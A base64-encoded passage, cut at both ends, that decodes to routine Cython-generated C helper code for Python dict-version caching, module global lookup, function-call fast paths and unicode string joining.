RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X29iamVjdF9kaWN0X3ZlcnNpb25fbWF0Y2hlcyhQeU9iamVjdCogb2JqLCBQWV9VSU5UNjRfVCB0cF9kaWN0X3ZlcnNpb24sIFBZX1VJTlQ2NF9UIG9ial9kaWN0X3ZlcnNpb24pIHtcbiAgICBQeU9iamVjdCAqZGljdCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdDtcbiAgICBpZiAodW5saWtlbHkoIWRpY3QpIHx8IHVubGlrZWx5KHRwX2RpY3RfdmVyc2lvbiAhPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpKSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgcmV0dXJuIG9ial9kaWN0X3ZlcnNpb24gPT0gX19QeXhfZ2V0X29iamVjdF9kaWN0X3ZlcnNpb24ob2JqKTtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlNcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUsIFBZX1VJTlQ2NF9UICpkaWN0X3ZlcnNpb24sIFB5T2JqZWN0ICoqZGljdF9jYWNoZWRfdmFsdWUpXG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lKVxuI2VuZGlmXG57XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tKSkge1xuICAgICAgICBpZiAoIVB5RXJyX09jY3VycmVkKCkpXG4gICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX05hbWVFcnJvcik7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXN1bHQgPSBQeU9iamVjdF9HZXRBdHRyKF9fcHl4X20sIG5hbWUpO1xuICAgIGlmIChsaWtlbHkocmVzdWx0KSkge1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICBQeUVycl9DbGVhcigpO1xuI2VsaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBuYW1lLCAmcmVzdWx0KSA9PSAtMSkpIFB5RXJyX0NsZWFyKCk7XG4gICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pXG4gICAgaWYgKGxpa2VseShyZXN1bHQpKSB7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuI2Vsc2VcbiAgICByZXN1bHQgPSBfUHlEaWN0X0dldEl0ZW1fS25vd25IYXNoKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIG5hbWUsICgoUHlBU0NJSU9iamVjdCAqKSBuYW1lKS0+aGFzaCk7XG4gICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pXG4gICAgaWYgKGxpa2VseShyZXN1bHQpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYocmVzdWx0KTtcbiAgICB9XG4gICAgUHlFcnJfQ2xlYXIoKTtcbiNlbmRpZlxuICAgIHJldHVybiBfX1B5eF9HZXRCdWlsdGluTmFtZShuYW1lKTtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICB0ZXJuYXJ5ZnVuYyBjYWxsID0gUHlfVFlQRShmdW5jKS0+dHBfY2FsbDtcbiAgICBpZiAodW5saWtlbHkoIWNhbGwpKVxuICAgICAgICByZXR1cm4gUHlPYmplY3RfQ2FsbChmdW5jLCBhcmcsIGt3KTtcbiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJlc3VsdCA9ICgqY2FsbCkoZnVuYywgYXJnLCBrdyk7XG4gICAgUHlfTGVhdmVSZWN1cnNpdmVDYWxsKCk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmIHVubGlrZWx5KCFQeUVycl9PY2N1cnJlZCgpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoXG4gICAgICAgICAgICBQeUV4Y19TeXN0ZW1FcnJvcixcbiAgICAgICAgICAgICJOVUxMIHJlc3VsdCB3aXRob3V0IGVycm9yIGluIFB5T2JqZWN0X0NhbGwiKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0pvaW4oUHlPYmplY3QqKiB2YWx1ZXMsIFB5X3NzaXplX3QgdmFsdWVfY291bnQsIFB5X3NzaXplX3QgcmVzdWx0X3VsZW5ndGgsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5X1VDUzQgbWF4X2NoYXIpIHtcbiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlPYmplY3QgKnJlc3VsdF91dmFsO1xuICAgIGludCByZXN1bHRfdWtpbmQsIGtpbmRfc2hpZnQ7XG4gICAgUHlfc3NpemVfdCBpLCBjaGFyX3BvcztcbiAgICB2b2lkICpyZXN1bHRfdWRhdGE7XG4gICAgaWYgKG1heF9jaGFyID4gMTExNDExMSkgbWF4X2NoYXIgPSAxMTE0MTExO1xuICAgIHJlc3VsdF91dmFsID0gUHlVbmljb2RlX05ldyhyZXN1bHRfdWxlbmd0aCwgbWF4X2NoYXIpO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0X3V2YWwpKSByZXR1cm4gTlVMTDtcbiAgICByZXN1bHRfdWtpbmQgPSAobWF4X2NoYXIgPD0gMjU1KSA/IFB5VW5pY29kZV8xQllURV9LSU5EIDogKG1heF9jaGFyIDw9IDY1NTM1KSA/IFB5VW5pY29kZV8yQllURV9LSU5EIDogUHlVbmljb2RlXzRCWVRFX0tJTkQ7XG4gICAga2luZF9zaGlmdCA9IChyZXN1bHRfdWtpbmQgPT0gUHlVbmljb2RlXzRCWVRFX0tJTkQpID8gMiA6IHJlc3VsdF91a2luZCAtIDE7XG4gICAgcmVzdWx0X3VkYXRhID0gUHlVbmljb2RlX0RBVEEocmVzdWx0X3V2YWwpO1xuICAgIGFzc2VydChraW5kX3NoaWZ0ID09IDIgfHwga2luZF9zaGlmdCA9PSAxIHx8IGtpbmRfc2hpZnQgPT0gMCk7XG4gICAgaWYgKHVubGlrZWx5KChQWV9TU0laRV9UX01BWCA+PiBraW5kX3NoaWZ0KSAtIHJlc3VsdF91bGVuZ3RoIDwgMCkpXG4gICAgICAgIGdvdG8gb3ZlcmZsb3c7XG4gICAgY2hhcl9wb3MgPSAwO1xuICAgIGZvciAoaT0wOyBpIDwgdmFsdWVfY291bnQ7IGkrKykge1xuICAgICAgICBpbnQgdWtpbmQ7XG4gICAgICAgIFB5X3NzaXplX3QgdWxlbmd0aDtcbiAgICAgICAgdm9pZCAqdWRhdGE7XG4gICAgICAgIFB5T2JqZWN0ICp1dmFsID0gdmFsdWVzW2ldO1xuICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgaWYgKF9fUHl4X1B5VW5pY29kZV9SRUFEWSh1dmFsKSA9PSAoLTEpKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICNlbmRpZlxuICAgICAgICB1bGVuZ3RoID0gX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgodXZhbCk7XG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgaWYgKHVubGlrZWx5KHVsZW5ndGggPCAwKSkgZ290byBiYWQ7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkoIXVsZW5ndGgpKVxuICAgICAgICAgICAgY29udGludWU7XG4gICAgICAgIGlmICh1bmxpa2VseSgoUFlfU1NJWkVfVF9NQVggPj4ga2luZF9zaGlmdCkgLSB1bGVuZ3RoIDwgY2hhcl9wb3MpKVxuICAgICAgICAgICAgZ290byBvdmVyZmxvdztcbiAgICAgICAgdWtpbmQgPSBfX1B5eF9QeVVuaWNvZGVfS0lORCh1dmFsKTtcbiAgICAgICAgdWRhdGEgPSBfX1B5eF9QeVVuaWNvZGVfREFUQSh1dmFsKTtcbiAgICAgICAgaWYgKHVraW5kID09IHJlc3VsdF91a2luZCkge1xuICAgICAgICAgICAgbWVtY3B5KChjaGFyICopcmVzdWx0X3VkYXRhICsgKGNoYXJfcG9zIDw8IGtpbmRfc2hpZnQpLCB1ZGF0YSwgKHNpemVfdCkgKHVsZW5ndGggPDwga2luZF9zaGlmdCkpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeVVuaWNvZGVfQ29weUNoYXJhY3RlcnMocmVzdWx0X3V2YWwsIGNoYXJfcG9zLCB1dmFsLCAwLCB1bGVuZ3RoKSA8IDApKSBnb3RvIGJhZDtcbiAgICAgICAgICAgICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKF9QeVVuaWNvZGVfRmFzdENvcHlDaGFyYWN0ZXJzKVxuICAgICAgICAgICAgX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMocmVzdWx0X3V2YWwsIGNoYXJfcG9zLCB1dmFsLCAwLCB1bGVuZ3RoKTtcbiAgICAgICAgICAgICNlbHNlXG4gICAgICAgICAgICBQeV9zc2l6ZV90IGo7XG4gICAgICAgICAgICBmb3IgKGo9MDsgaiA8IHVsZW5ndGg7IGorKykge1xuICAgICAgICAgICAgICAgIFB5X1VDUzQgdWNoYXIgPSBfX1B5eF9QeVVuaWNvZGVfUkVBRCh1a2luZCwgdWRhdGEsIGopO1xuICAgICAgICAgICAgICAgIF9fUHl4X1B5VW5pY29kZV9XUklURShyZXN1bHRfdWtpbmQsIHJlc3VsdF91ZGF0YSwgY2hhcl9wb3MraiwgdWNoYXIpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgIH1cbiAgICAgICAgY2hhcl9wb3MgKz0gdWxlbmd0aDtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdF91dmFsO1xub3ZlcmZsb3c6XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsICJqb2luKCkgcmVzdWx0IGlzIHRvbyBsb25nIGZvciBhIFB5dGhvbiBzdHJpbmciKTtcbmJhZDpcbiAgICBQeV9ERUNSRUYocmVzdWx0X3V2YWwpO1xuICAgIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeV9zc2l6ZV90IGk7XG4gICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7XG4gICAgUHlPYmplY3QgKnZhbHVlX3R1cGxlID0gUHlUdXBsZV9OZXcodmFsdWVfY291bnQpO1xuICAgIGlmICh1bmxpa2VseSghdmFsdWVfdHVwbGUpKSByZXR1cm4gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihtYXhfY2hhcik7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIocmVzdWx0X3VsZW5ndGgpO1xuICAgIGZvciAoaT0wOyBpPHZhbHVlX2NvdW50OyBpKyspIHtcbiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0odmFsdWVfdHVwbGUsIGksIHZhbHVlc1tpXSkgIT0gKDApKSBnb3RvIGJhZDtcbiAgICAgICAgUHlfSU5DUkVGKHZhbHVlc1tpXSk7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUsIHZhbHVlX3R1cGxlKTtcbmJhZDpcbiAgICBQeV9ERUNSRUYodmFsdWVfdHVwbGUpO1xuICAgIHJldHVybiByZXN1bHQ7XG4jZW5kaWZcbn1cblxuXG4jaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMICYmICFDWVRIT05fVkVDVE9SQ0FMTFxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsTm9LdyhQeUNvZGVPYmplY3QgKmNvLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmEsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpnbG9iYWxzKSB7XG4gICAgUHlGcmFtZU9iamVjdCAqZjtcbiAgICBQeVRocmVhZFN0YXRlICp0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7XG4gICAgUHlPYmplY3QgKipmYXN0bG9jYWxzO1xuICAgIFB5X3NzaXplX3QgaTtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIGFzc2VydChnbG9iYWxzICE9IE5VTEwpO1xuICAgIFxuICAgIGFzc2VydCh0c3RhdGUgIT0gTlVMTCk7XG4gICAgZiA9IFB5RnJhbWVfTmV3KHRzdGF0ZSwgY28sIGdsb2JhbHMsIE5VTEwpO1xuICAgIGlmIChmID09IE5VTEwpIHtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIGZhc3Rsb2NhbHMgPSBfX1B5eF9QeUZyYW1lX0dldExvY2Fsc3BsdXMoZik7XG4gICAgZm9yIChpID0gMDsgaSA8IG5hOyBpKyspIHtcbiAgICAgICAgUHlfSU5DUkVGKCphcmdzKTtcbiAgICAgICAgZmFzdGxvY2Fsc1tpXSA9ICphcmdzKys7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5RXZhbF9FdmFsRnJhbWVFeChmLDApO1xuICAgICsrdHN0YXRlLT5yZWN1cnNpb25fZGVwdGg7XG4gICAgUHlfREVDUkVGKGYpO1xuICAgIC0tdHN0YXRlLT5yZWN1cnNpb25fZGVwdGg7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncykge1xuICAgIFB5Q29kZU9iamVjdCAqY28gPSAoUHlDb2RlT2JqZWN0ICopUHlGdW5jdGlvbl9HRVRfQ09ERShmdW5jKTtcbiAgICBQeU9iamVjdCAqZ2xvYmFscyA9IFB5RnVuY3Rpb25fR0VUX0dMT0JBTFMoZnVuYyk7XG4gICAgUHlPYmplY3QgKmFyZ2RlZnMgPSBQeUZ1bmN0aW9uX0dFVF9ERUZBVUxUUyhmdW5jKTtcbiAgICBQeU9iamVjdCAqY2xvc3VyZTtcbiAgICBQeU9iamVjdCAqa3dkZWZzO1xuICAgIFB5T2JqZWN0ICprd3R1cGxlLCAqKms7XG4gICAgUHlPYmplY3QgKipkO1xuICAgIFB5X3NzaXplX3QgbmQ7XG4gICAgUHlfc3NpemVfdCBuaztcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIGFzc2VydChrd2FyZ3MgPT0gTlVMTCB8fCBQeURpY3RfQ2hlY2soa3dhcmdzKSk7XG4gICAgbmsgPSBrd2FyZ3MgPyBQeURpY3RfU2l6ZShrd2FyZ3MpIDogMDtcbiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpIHtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIGlmIChcbiAgICAgICAgICAgIGNvLT5jb19rd29ubHlhcmdjb3VudCA9PSAwICYmXG4gICAgICAgICAgICBsaWtlbHkoa3dhcmdzID09IE5VTEwgfHwgbmsgPT0gMCkgJiZcbiAgICAgICAgICAgIGNvLT5jb19mbGFncyA9PSAoQ09fT1BUSU1JWkVEIHwgQ09fTkVXTE9DQUxTIHwgQ09fTk9GUkVFKSkge1xuICAgICAgICBpZiAoYXJnZGVmcyA9PSBOVUxMICYmIGNvLT5jb19hcmdjb3VudCA9PSBuYXJncykge1xuICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbE5vS3coY28sIGFyZ3MsIG5hcmdzLCBnbG9iYWxzKTtcbiAgICAgICAgICAgIGdvdG8gZG9uZTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmIChuYXJncyA9PSAwICYmIGFyZ2RlZnMgIT0gTlVMTFxuICAgICAgICAgICAgICAgICAmJiBjby0+Y29fYXJnY291bnQgPT0gUHlfU0laRShhcmdkZWZzKSkge1xuICAgICAgICAgICAgXG4gICAgICAgICAgICBhcmdzID0gJlB5VHVwbGVfR0VUX0lURU0oYXJnZGVmcywgMCk7XG4gICAgICAgICAgICByZXN1bHQgPV9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KGNvLCBhcmdzLCBQeV9TSVpFKGFyZ2RlZnMpLCBnbG9iYWxzKTtcbiAgICAgICAgICAgIGdvdG8gZG9uZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBpZiAoa3dhcmdzICE9IE5VTEwpIHtcbiAgICAgICAgUHlfc3NpemVfdCBwb3MsIGk7XG4gICAgICAgIGt3dHVwbGUgPSBQeVR1cGxlX05ldygyICogbmspO1xuICAgICAgICBpZiAoa3d0dXBsZSA9PSBOVUxMKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBOVUxMO1xuICAgICAgICAgICAgZ290byBkb25lO1xuICAgICAgICB9XG4gICAgICAgIGsgPSAmUHlUdXBsZV9HRVRfSVRFTShrd3R1cGxlLCAwKTtcbiAgICAgICAgcG9zID0gaSA9IDA7XG4gICAgICAgIHdoaWxlIChQeURpY3RfTmV4dChrd2FyZ3MsICZwb3MsICZrW2ldLCAma1tpKzFdKSkge1xuICAgICAgICAgICAgUHlfSU5DUkVGKGtbaV0pO1xuICAgICAgICAgICAgUHlfSU5DUkVGKGtbaSsxXSk7XG4gICAgICAgICAgICBpICs9IDI7XG4gICAgICAgIH1cbiAgICAgICAgbmsgPSBpIC8gMjtcbiAgICB9XG4gICAgZWxzZSB7XG4gICAgICAgIGt3dHVwbGUgPSBOVUxMO1xuICAgICAgICBrID0gTlVMTDtcbiAgICB9XG4gICAgY2xvc3VyZSA9IFB5RnVuY3Rpb25fR0VUX0NMT1NVUkUoZnVuYyk7XG4gICAga3dkZWZzID0gUHlGdW5jdGlvbl9HRVRfS1dfREVGQVVMVFMoZnVuYyk7XG4gICAgaWYgKGFyZ2RlZnMgIT0gTlVMTCkge1xuICAgICAgICBkID0gJlB5VHVwbGVfR0VUX0lURU0oYXJnZGVmcywgMCk7XG4gICAgICAgIG5kID0gUHlfU0laRShhcmdkZWZzKTtcbiAgICB9XG4gICAgZWxzZSB7XG4gICAgICAgIGQgPSBOVUxMO1xuICAgICAgICBuZCA9IDA7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5RXZhbF9FdmFsQ29kZUV4KChQeU9iamVjdCopY28sIGdsb2JhbHMsIChQeU9iamVjdCAqKU5VTEwsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJncywgKGludCluYXJncyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrLCAoaW50KW5rLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQsIChpbnQpbmQsIGt3ZGVmcywgY2xvc3VyZSk7XG4gICAgUHlfWERFQ1JFRihrd3R1cGxlKTtcbmRvbmU6XG4gICAgUHlfTGVhdmVSZWN1cnNpdmVDYWxsKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpIHtcbiAgICBQeU9iamVjdCAqc2VsZiwgKnJlc3VsdDtcbiAgICBQeUNGdW5jdGlvbiBjZnVuYztcbiAgICBjZnVuYyA9IF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYyk7XG4gICAgc2VsZiA9IF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfU0VMRihmdW5jKTtcbiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJlc3VsdCA9IGNmdW5jKHNlbGYsIGFyZyk7XG4gICAgUHlfTGVhdmVSZWN1cnNpdmVDYWxsKCk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmIHVubGlrZWx5KCFQeUVycl9PY2N1cnJlZCgpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoXG4gICAgICAgICAgICBQeUV4Y19TeXN0ZW1FcnJvcixcbiAgICAgICAgICAgICJOVUxMIHJlc3VsdCB3aXRob3V0IGVycm9yIGluIFB5T2JqZWN0X0NhbGwiKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbF9mYWxsYmFjayhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKiBjb25zdCphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHtcbiAgICBQeU9iamVjdCAqYXJnc3R1cGxlO1xuICAgIFB5T2JqZWN0ICpyZXN1bHQgPSAwO1xuICAgIHNpemVfdCBpO1xuICAgIGFyZ3N0dXBsZSA9IFB5VHVwbGVfTmV3KChQeV9zc2l6ZV90KW5hcmdzKTtcbiAgICBpZiAodW5saWtlbHkoIWFyZ3N0dXBsZSkpIHJldHVybiBOVUxMO1xuICAgIGZvciAoaSA9IDA7IGkgPCBuYXJnczsgaSsrKSB7XG4gICAgICAgIFB5X0lOQ1JFRihhcmdzW2ldKTtcbiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oYXJnc3R1cGxlLCAoUHlfc3NpemVfdClpLCBhcmdzW2ldKSAhPSAoMCkpIGdvdG8gYmFkO1xuICAgIH1cbiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIGFyZ3N0dXBsZSwga3dhcmdzKTtcbiAgYmFkOlxuICAgIFB5X0RFQ1JFRihhcmdzdHVwbGUpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcbiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeVZlY3RvcmNhbGxfRnVuY3Rpb24oY2FsbGFibGUpIF9QeVZlY3RvcmNhbGxfRnVuY3Rpb24oY2FsbGFibGUpXG4gICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgdmVjdG9yY2FsbGZ1bmMgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKFB5T2JqZWN0ICpjYWxsYWJsZSkge1xuICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKGNhbGxhYmxlKTtcbiAgICAjaWYgZGVmaW5lZChfX1B5eF9DeUZ1bmN0aW9uX1VTRUQpXG4gICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2tFeGFjdChjYWxsYWJsZSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGNhbGxhYmxlKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgaWYgKCFQeVR5cGVfSGFzRmVhdHVyZSh0cCwgUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwpKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBhc3NlcnQoUHlDYWxsYWJsZV9DaGVjayhjYWxsYWJsZSkpO1xuICAgIFB5X3NzaXplX3Qgb2Zmc2V0ID0gdHAtPnRwX3ZlY3RvcmNhbGxfb2Zmc2V0O1xuICAgIGFzc2VydChvZmZzZXQgPiAwKTtcbiAgICB2ZWN0b3JjYWxsZnVuYyBwdHI7XG4gICAgbWVtY3B5KCZwdHIsIChjaGFyICopIGNhbGxhYmxlICsgb2Zmc2V0LCBzaXplb2YocHRyKSk7XG4gICAgcmV0dXJuIHB0cjtcbn1cbiAgI2Vsc2VcbiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKVxuICAjZW5kaWZcbiNlbmRpZlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgX25hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7XG4gICAgUHlfc3NpemVfdCBuYXJncyA9IF9fUHl4X1B5VmVjdG9yY2FsbF9OQVJHUyhfbmFyZ3MpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIGlmIChuYXJncyA9PSAwICYmIGt3YXJncyA9PSBOVUxMKSB7XG4gICAgICAgIGlmIChfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgbGlrZWx5KCBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICYgTUVUSF9OT0FSR1MpKVxuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRoTyhmdW5jLCBOVUxMKTtcbiAgICB9XG4gICAgZWxzZSBpZiAobmFyZ3MgPT0gMSAmJiBrd2FyZ3MgPT0gTlVMTCkge1xuICAgICAgICBpZiAoX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICYmIGxpa2VseSggX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GTEFHUyhmdW5jKSAmIE1FVEhfTykpXG4gICAgICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKGZ1bmMsIGFyZ3NbMF0pO1xuICAgIH1cbiNlbmRpZlxuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwQjFcbiAgICAjaWYgQ1lUSE9OX0ZBU1RfUFlDQ0FMTFxuICAgIGlmIChQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSkge1xuICAgICAgICBpZiAoa3dhcmdzKSB7XG4gICAgICAgICAgICByZXR1cm4gX1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsRGljdChmdW5jLCBhcmdzLCBuYXJncywga3dhcmdzKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJldHVybiBfUHlDRnVuY3Rpb25fRmFzdENhbGxLZXl3b3JkcyhmdW5jLCBhcmdzLCBuYXJncywgTlVMTCk7XG4gICAgICAgIH1cbiAgICB9XG4gICAgaWYgKCFrd2FyZ3MgJiYgX19QeXhfSVNfVFlQ